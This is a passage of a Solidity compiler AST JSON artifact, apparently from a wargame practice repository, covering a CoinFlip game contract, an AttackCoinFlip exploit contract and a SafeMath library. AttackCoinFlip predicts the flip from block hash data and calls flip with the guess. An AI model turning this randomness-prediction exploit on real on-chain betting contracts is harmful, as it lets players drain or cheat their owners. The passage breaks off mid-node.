																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "755:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "737:19:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 80,
															"nodeType": "ExpressionStatement",
															"src": "737:19:0"
														},
														{
															"expression": {
																"hexValue": "66616c7365",
																"id": 81,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "772:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															"functionReturnParameters": 26,
															"id": 82,
															"nodeType": "Return",
															"src": "765:12:0"
														}
													]
												},
												"id": 84,
												"nodeType": "IfStatement",
												"src": "648:137:0",
												"trueBody": {
													"id": 76,
													"nodeType": "Block",
													"src": "668:54:0",
													"statements": [
														{
															"expression": {
																"id": 72,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "677:17:0",
																"subExpression": {
																	"id": 71,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 7,
																	"src": "677:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 73,
															"nodeType": "ExpressionStatement",
															"src": "677:17:0"
														},
														{
															"expression": {
																"hexValue": "74727565",
																"id": 74,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "710:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "true"
															},
															"functionReturnParameters": 26,
															"id": 75,
															"nodeType": "Return",
															"src": "703:11:0"
														}
													]
												}
											}
										]
									},
									"functionSelector": "1d263f67",
									"id": 86,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "flip",
									"nameLocation": "346:4:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 23,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 22,
												"mutability": "mutable",
												"name": "_guess",
												"nameLocation": "356:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 86,
												"src": "351:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 21,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "351:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "350:13:0"
									},
									"returnParameters": {
										"id": 26,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 25,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 86,
												"src": "380:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 24,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "380:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "379:6:0"
									},
									"scope": 87,
									"src": "337:453:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 88,
							"src": "65:728:0",
							"usedErrors": []
						}
					],
					"src": "0:793:0"
				},
				"id": 0
			},
			"CoinFlip/attackCoinFlip.sol": {
				"ast": {
					"absolutePath": "CoinFlip/attackCoinFlip.sol",
					"exportedSymbols": {
						"AttackCoinFlip": [
							155
						],
						"CoinFlip": [
							87
						],
						"SafeMath": [
							467
						]
					},
					"id": 156,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 89,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:1"
						},
						{
							"absolutePath": "Fallback/SafeMath.sol",
							"file": "../Fallback/SafeMath.sol",
							"id": 90,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 156,
							"sourceUnit": 468,
							"src": "27:34:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "CoinFlip/CoinFlip.sol",
							"file": "./CoinFlip.sol",
							"id": 91,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 156,
							"sourceUnit": 88,
							"src": "63:24:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "AttackCoinFlip",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 155,
							"linearizedBaseContracts": [
								155
							],
							"name": "AttackCoinFlip",
							"nameLocation": "98:14:1",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"global": false,
									"id": 94,
									"libraryName": {
										"id": 92,
										"name": "SafeMath",
										"nodeType": "IdentifierPath",
										"referencedDeclaration": 467,
										"src": "125:8:1"
									},
									"nodeType": "UsingForDirective",
									"src": "119:27:1",
									"typeName": {
										"id": 93,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "138:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"constant": false,
									"functionSelector": "3fe6dd29",
									"id": 96,
									"mutability": "mutable",
									"name": "guessingValue",
									"nameLocation": "167:13:1",
									"nodeType": "VariableDeclaration",
									"scope": 155,
									"src": "152:28:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 95,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "152:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"functionSelector": "79e41b39",
									"id": 98,
									"mutability": "mutable",
									"name": "guessing",
									"nameLocation": "199:8:1",
									"nodeType": "VariableDeclaration",
									"scope": 155,
									"src": "187:20:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bool",
										"typeString": "bool"
									},
									"typeName": {
										"id": 97,
										"name": "bool",
										"nodeType": "ElementaryTypeName",
										"src": "187:4:1",
										"typeDescriptions": {
											"typeIdentifier": "t_bool",
											"typeString": "bool"
										}
									},
									"visibility": "public"
								},
								{
									"body": {
										"id": 129,
										"nodeType": "Block",
										"src": "274:259:1",
										"statements": [
											{
												"assignments": [
													104
												],
												"declarations": [
													{
														"constant": false,
														"id": 104,
														"mutability": "mutable",
														"name": "tmpOfCurrent",
														"nameLocation": "293:12:1",
														"nodeType": "VariableDeclaration",
														"scope": 129,
														"src": "285:20:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 103,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "285:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 112,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"expression": {
																		"id": 108,
																		"name": "block",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 4294967292,
																		"src": "326:5:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_block",
																			"typeString": "block"
																		}
																	},
																	"id": 109,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "number",
																	"nodeType": "MemberAccess",
																	"src": "326:12:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 107,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967291,
																"src": "316:9:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 110,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "316:23:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 106,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "308:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 105,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "308:7:1",
															"typeDescriptions": {}
														}
													},
													"id": 111,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "308:32:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "285:55:1"
											},
											{
												"expression": {
													"id": 118,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 113,
														"name": "guessingValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 96,
														"src": "351:13:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"arguments": [
															{
																"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
																"id": 116,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "384:77:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
																	"typeString": "int_const 5789...(69 digits omitted)...9968"
																},
																"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
																	"typeString": "int_const 5789...(69 digits omitted)...9968"
																}
															],
															"expression": {
																"id": 114,
																"name": "tmpOfCurrent",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 104,
																"src": "367:12:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 115,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "div",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 376,
															"src": "367:16:1",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 117,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "367:95:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "351:111:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 119,
												"nodeType": "ExpressionStatement",
												"src": "351:111:1"
											},
											{
												"expression": {
													"id": 127,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 120,
														"name": "guessing",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 98,
														"src": "477:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"condition": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 123,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 121,
																"name": "guessingValue",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 96,
																"src": "488:13:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"hexValue": "31",
																"id": 122,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "505:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_1_by_1",
																	"typeString": "int_const 1"
																},
																"value": "1"
															},
															"src": "488:18:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseExpression": {
															"hexValue": "66616c7365",
															"id": 125,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "516:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "false"
														},
														"id": 126,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "Conditional",
														"src": "488:33:1",
														"trueExpression": {
															"hexValue": "74727565",
															"id": 124,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "509:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "477:44:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 128,
												"nodeType": "ExpressionStatement",
												"src": "477:44:1"
											}
										]
									},
									"functionSelector": "99b084bf",
									"id": 130,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "guessTheCurrentBlockValue",
									"nameLocation": "223:25:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 99,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "248:2:1"
									},
									"returnParameters": {
										"id": 102,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 101,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 130,
												"src": "266:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 100,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "266:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "265:9:1"
									},
									"scope": 155,
									"src": "214:319:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 153,
										"nodeType": "Block",
										"src": "582:119:1",
										"statements": [
											{
												"assignments": [
													136
												],
												"declarations": [
													{
														"constant": false,
														"id": 136,
														"mutability": "mutable",
														"name": "result",
														"nameLocation": "598:6:1",
														"nodeType": "VariableDeclaration",
														"scope": 153,
														"src": "593:11:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 135,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "593:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 138,
												"initialValue": {
													"hexValue": "66616c7365",
													"id": 137,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "607:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "false"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "593:19:1"
											},
											{
												"assignments": [
													141
												],
												"declarations": [
													{
														"constant": false,
														"id": 141,
														"mutability": "mutable",
														"name": "C",
														"nameLocation": "632:1:1",
														"nodeType": "VariableDeclaration",
														"scope": 153,
														"src": "623:10:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$87",
															"typeString": "contract CoinFlip"
														},
														"typeName": {
															"id": 140,
															"nodeType": "UserDefinedTypeName",
															"pathNode": {
																"id": 139,
																"name": "CoinFlip",
																"nodeType": "IdentifierPath",
																"referencedDeclaration": 87,
																"src": "623:8:1"
															},
															"referencedDeclaration": 87,
															"src": "623:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_CoinFlip_$87",
																"typeString": "contract CoinFlip"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 145,
												"initialValue": {
													"arguments": [
														{
															"id": 143,
															"name": "_contract",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 132,
															"src": "645:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 142,
														"name": "CoinFlip",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 87,
														"src": "636:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_contract$_CoinFlip_$87_$",
															"typeString": "type(contract CoinFlip)"
														}
													},
													"id": 144,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "636:19:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_CoinFlip_$87",
														"typeString": "contract CoinFlip"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "623:32:1"
											},
											{
												"expression": {
													"id": 151,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 146,
														"name": "result",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 136,
														"src": "666:6:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"arguments": [
															{
																"id": 149,
																"name": "guessing",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 98,
																"src": "682:8:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															],
															"expression": {
																"id": 147,
																"name": "C",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 141,
																"src": "675:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_CoinFlip_$87",
																	"typeString": "contract CoinFlip"
																}
															},
															"id": 148,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "flip",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 86,
															"src": "675:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_function_external_nonpayable$_t_bool_$returns$_t_bool_$",
																"typeString": "function (bool) external returns (bool)"
															}
														},
														"id": 150,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "675:16:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "666:25:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 152,
												"nodeType": "ExpressionStatement",
												"src": "666:25:1"
											}
										]
									},
									"functionSelector": "d018db3e",
									"id": 154,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "attack",
									"nameLocation": "548:6:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 133,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 132,
												"mutability": "mutable",
												"name": "_contract",
												"nameLocation": "563:9:1",
												"nodeType": "VariableDeclaration",
												"scope": 154,
												"src": "555:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 131,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "555:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "554:19:1"
									},
									"returnParameters": {
										"id": 134,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "582:0:1"
									},
									"scope": 155,
									"src": "539:162:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 156,
							"src": "89:615:1",
							"usedErrors": []
						}
					],
					"src": "0:704:1"
				},
				"id": 1
			},
			"Fallback/SafeMath.sol": {
				"ast": {
					"absolutePath": "Fallback/SafeMath.sol",
					"exportedSymbols": {
						"SafeMath": [
							467
						]
					},
					"id": 468,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 157,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "95:23:2"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "SafeMath",
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": {
								"id": 158,
								"nodeType": "StructuredDocumentation",
								"src": "279:201:2",
								"text": " @dev Wrappers over Solidity's arithmetic operations.\n NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler\n now has built in overflow checking."
							},
							"fullyImplemented": true,
							"id": 467,
							"linearizedBaseContracts": [
								467
							],
							"name": "SafeMath",
							"nameLocation": "490:8:2",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 189,
										"nodeType": "Block",
										"src": "723:146:2",
										"statements": [
											{
												"id": 188,
												"nodeType": "UncheckedBlock",
												"src": "734:128:2",
												"statements": [
													{
														"assignments": [
															171
														],
														"declarations": [
															{
																"constant": false,
																"id": 171,
																"mutability": "mutable",
																"name": "c",
																"nameLocation": "767:1:2",
																"nodeType": "VariableDeclaration",
																"scope": 188,
																"src": "759:9:2",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 170,
																	"name": "uint256",
																	"nodeType": "ElementaryTypeName",
																	"src": "759:7:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"visibility": "internal"
															}
														],
														"id": 175,
														"initialValue": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 174,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 172,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 161,
																"src": "771:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "+",
															"rightExpression": {
																"id": 173,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 163,
																"src": "775:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "771:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "759:17:2"
													},
													{
														"condition": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 178,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 176,
																"name": "c",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 171,
																"src": "795:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<",
															"rightExpression": {
																"id": 177,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 161,
																"src": "799:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "795:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"id": 183,
														"nodeType": "IfStatement",
														"src": "791:28:2",
														"trueBody": {
															"expression": {
																"components": [
																	{
																		"hexValue": "66616c7365",
																		"id": 179,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "bool",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "810:5:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"value": "false"
																	},
																	{
																		"hexValue": "30",
																		"id": 180,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "817:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"id": 181,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "809:10:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
																	"typeString": "tuple(bool,int_const 0)"
																}
															},
															"functionReturnParameters": 169,
															"id": 182,
															"nodeType": "Return",
															"src": "802:17:2"
														}
													},
													{
														"expression": {
															"components": [
																{
																	"hexValue": "74727565",
																	"id": 184,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "bool",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "842:4:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"value": "true"
																},
																{
																	"id": 185,
																	"name": "c",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 171,
																	"src": "848:1:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 186,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "841:9:2",
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
																"typeString": "tuple(bool,uint256)"
															}
														},
														"functionReturnParameters": 169,
														"id": 187,
														"nodeType": "Return",
														"src": "834:16:2"
													}
												]
											}
										]
									},
									"documentation": {
										"id": 159,
										"nodeType": "StructuredDocumentation",
										"src": "506:135:2",
										"text": " @dev Returns the addition of two unsigned integers, with an overflow flag.\n _Available since v3.4._"
									},
									"id": 190,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryAdd",
									"nameLocation": "656:6:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 164,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 161,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "671:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 190,
												"src": "663:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 160,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "663:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 163,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "682:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 190,
												"src": "674:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 162,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "674:7:2",
													"typeDescriptions": {
